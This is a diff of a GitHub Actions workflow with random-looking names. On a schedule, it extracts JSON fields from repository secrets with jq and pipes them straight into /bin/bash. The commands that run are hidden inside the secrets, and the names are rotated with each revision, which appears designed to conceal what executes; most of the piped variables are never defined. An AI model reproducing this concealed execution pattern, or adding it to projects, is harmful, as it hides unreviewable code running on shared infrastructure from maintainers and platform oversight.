@@ -1,9 +1,9 @@
 name: wuyuqian9721
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 5/6 * * *'
-
+    - cron: '11 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,20 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: wuyuqian9721
         env:
-          irm527: ${{ secrets.irm527 }}
+          tedr8455: ${{ secrets.tedr8455 }}
         run: |
-          echo $irm527 | jq -r .kjqw114 | /bin/bash
-          echo $t50 | jq -r .wwgbd566 | /bin/bash
-          echo $bly4071 | jq -r .d02738 | /bin/bash
-          echo $kyw51 | jq -r .qiptr69573 | /bin/bash
-          echo $u34417 | jq -r .ij945 | /bin/bash
-          echo $by16 | jq -r .m08238 | /bin/bash
-          echo $x274 | jq -r .sp53 | /bin/bash
-          echo $o47 | jq -r .mt74672 | /bin/bash
-          echo $yofa629 | jq -r .kq23878 | /bin/bash
-          echo $roh3335 | jq -r .vnhpj83 | /bin/bash
-          echo $tlobj2 | jq -r .zy6 | /bin/bash
-          echo $a129 | jq -r .lusmh14411 | /bin/bash
-          echo $lypt76 | jq -r .ejm737 | /bin/bash
-          echo $tcjzm2215 | jq -r .iujhj8267 | /bin/bash
+          echo $tedr8455 | jq -r .vkmam8 | /bin/bash
+          echo $swl6 | jq -r .vteb8 | /bin/bash
+          echo $ipohs0 | jq -r .mocq9453 | /bin/bash
+          echo $v63 | jq -r .ahe97 | /bin/bash
+          echo $e556 | jq -r .afuts06108 | /bin/bash
+          echo $jakn8395 | jq -r .su70617 | /bin/bash
+          echo $je99549 | jq -r .xu19594 | /bin/bash
+          echo $sf71017 | jq -r .wr3033 | /bin/bash
+          echo $kfxl5 | jq -r .wrs9 | /bin/bash
+          echo $cuj75295 | jq -r .kanpr11181 | /bin/bash
+          echo $k77718 | jq -r .bi36 | /bin/bash
+          echo $zyfr084 | jq -r .amlf71952 | /bin/bash
 
